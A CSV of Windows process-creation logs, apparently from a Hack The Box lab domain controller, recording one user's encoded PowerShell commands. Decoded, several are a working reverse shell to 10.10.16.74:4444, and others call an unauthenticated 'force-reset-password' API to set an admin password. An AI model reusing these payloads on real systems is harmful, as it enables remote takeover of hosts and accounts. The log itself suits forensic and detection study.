"TimeGenerated","Computer","User","Image","CommandLine","ParentImage","ParentCommandLine","ProcessGuid","ParentProcessGuid"
"11/8/2026, 12:46:41.153856 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABiAG8AZAB5ACAAPQAgAEAAewBJAHMAUwB5AHMAQQBkAG0AaQBuAD0AIgB0AHIAdQBlACIAOwBPAGwAZABQAGEAcwBzAHcAbwByAGQAPQAiAHcAaABhAHQAZQB2AGUAcgAiADsAVQBzAGUAcgBuAGEAbQBlAD0AIgBhAGQAbQBpAG4AIgA7AE4AZQB3AFAAYQBzAHMAdwBvAHIAZAA9ACIAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAQAAjACIAOwBDAG8AbgBmAGkAcgBtAFAAYQBzAHMAdwBvAHIAZAA9ACIAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAQAAjACIAfQAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4ACgB0AHIAeQAgAHsACgAgACAAIAAgACQAcgAgAD0AIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMQA3ADAAMQA3AC8AYQBwAGkALwB2ADEALwBhAHUAdABoAC8AZgBvAHIAYwBlAC0AcgBlAHMAZQB0AC0AcABhAHMAcwB3AG8AcgBkACIAIAAtAE0AZQB0AGgAbwBkACAAUABvAHMAdAAgAC0AQgBvAGQAeQAgACQAYgBvAGQAeQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgBhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwBqAHMAbwBuACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAAoAIAAgACAAIAAiAFMAVABBAFQAVQBTADoAJAAoACQAcgAuAFMAdABhAHQAdQBzAEMAbwBkAGUAKQBgAG4AQgBPAEQAWQA6ACQAKAAkAHIALgBDAG8AbgB0AGUAbgB0ACkAIgAgAHwAIABPAHUAdAAtAEYAaQBsAGUAIAAtAEYAaQBsAGUAUABhAHQAaAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwBtAHIAZQBzAC4AdAB4AHQAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGEAcwBjAGkAaQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4AUgBlAHMAcABvAG4AcwBlAC4ARwBlAHQAUgBlAHMAcABvAG4AcwBlAFMAdAByAGUAYQBtACgAKQAKACAAIAAgACAAJAByAGUAYQBkAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAcwB0AHIAZQBhAG0AKQAKACAAIAAgACAAJABiAG8AZAB5ADIAIAA9ACAAJAByAGUAYQBkAGUAcgAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQAKACAAIAAgACAAIgBTAFQAQQBUAFUAUwA6ACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAFIAZQBzAHAAbwBuAHMAZQAuAFMAdABhAHQAdQBzAEMAbwBkAGUALgB2AGEAbAB1AGUAXwBfACkAYABuAEIATwBEAFkAOgAkAGIAbwBkAHkAMgAiACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAG0AcgBlAHMALgB0AHgAdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAYQBzAGMAaQBpAAoAfQAKAA==","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-19b1-6a7b-6506-000000003200","7e3eed90-192b-6a7b-4f06-000000003200"
"11/8/2026, 12:46:40.915407 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-19b0-6a7b-6306-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:46:37.885406 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-19ad-6a7b-5f06-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:45:37.891253 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1971-6a7b-5806-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:44:37.887769 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1935-6a7b-5206-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:44:28.03879 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-192c-6a7b-5006-000000003200","7e3eed90-192b-6a7b-4f06-000000003200"
"11/8/2026, 12:44:27.386497 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-192b-6a7b-4c06-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:43:37.886401 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-18f9-6a7b-4706-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:42:37.88537 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-18bd-6a7b-4106-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:41:37.886438 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1881-6a7b-3706-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:40:37.889449 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1845-6a7b-3006-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:39:37.896788 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1809-6a7b-1c06-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:38:58.689113 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABiAG8AZAB5ACAAPQAgAEAAewBJAHMAUwB5AHMAQQBkAG0AaQBuAD0AIgB0AHIAdQBlACIAOwBPAGwAZABQAGEAcwBzAHcAbwByAGQAPQAiAHcAaABhAHQAZQB2AGUAcgAiADsAVQBzAGUAcgBuAGEAbQBlAD0AIgBhAGQAbQBpAG4AIgA7AE4AZQB3AFAAYQBzAHMAdwBvAHIAZAA9ACIAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAQAAjACIAOwBDAG8AbgBmAGkAcgBtAFAAYQBzAHMAdwBvAHIAZAA9ACIAUABAAHMAcwB3ADAAcgBkADEAMgAzACEAQAAjACIAfQAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4ACgB0AHIAeQAgAHsACgAgACAAIAAgACQAcgAgAD0AIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMQA3ADAAMQA3AC8AYQBwAGkALwB2ADEALwBhAHUAdABoAC8AZgBvAHIAYwBlAC0AcgBlAHMAZQB0AC0AcABhAHMAcwB3AG8AcgBkACIAIAAtAE0AZQB0AGgAbwBkACAAUABvAHMAdAAgAC0AQgBvAGQAeQAgACQAYgBvAGQAeQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgBhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwBqAHMAbwBuACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAAoAIAAgACAAIAAiAFMAVABBAFQAVQBTADoAJAAoACQAcgAuAFMAdABhAHQAdQBzAEMAbwBkAGUAKQBgAG4AQgBPAEQAWQA6ACQAKAAkAHIALgBDAG8AbgB0AGUAbgB0ACkAIgAgAHwAIABPAHUAdAAtAEYAaQBsAGUAIAAtAEYAaQBsAGUAUABhAHQAaAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwBtAHIAZQBzAC4AdAB4AHQAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGEAcwBjAGkAaQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4AUgBlAHMAcABvAG4AcwBlAC4ARwBlAHQAUgBlAHMAcABvAG4AcwBlAFMAdAByAGUAYQBtACgAKQAKACAAIAAgACAAJAByAGUAYQBkAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAcwB0AHIAZQBhAG0AKQAKACAAIAAgACAAJABiAG8AZAB5ADIAIAA9ACAAJAByAGUAYQBkAGUAcgAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQAKACAAIAAgACAAIgBTAFQAQQBUAFUAUwA6ACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAFIAZQBzAHAAbwBuAHMAZQAuAFMAdABhAHQAdQBzAEMAbwBkAGUALgB2AGEAbAB1AGUAXwBfACkAYABuAEIATwBEAFkAOgAkAGIAbwBkAHkAMgAiACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAG0AcgBlAHMALgB0AHgAdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAYQBzAGMAaQBpAAoAfQAKAA==","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-17e2-6a7b-1906-000000003200","7e3eed90-171f-6a7b-fc05-000000003200"
"11/8/2026, 12:38:58.479915 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-17e2-6a7b-1706-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:38:37.885854 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-17cd-6a7b-1206-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:37:37.88715 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1791-6a7b-0b06-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:37:14.342127 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-177a-6a7b-0806-000000003200","7e3eed90-171f-6a7b-fc05-000000003200"
"11/8/2026, 12:37:14.127064 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-177a-6a7b-0606-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:36:37.88525 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1755-6a7b-0106-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:35:43.636448 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-171f-6a7b-fd05-000000003200","7e3eed90-171f-6a7b-fc05-000000003200"
"11/8/2026, 12:35:43.004062 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-171f-6a7b-fa05-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:35:37.886417 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1719-6a7b-f605-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:34:37.89035 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-16dd-6a7b-f005-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:33:37.893698 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-16a1-6a7b-ea05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:32:37.885259 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1665-6a7b-e405-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
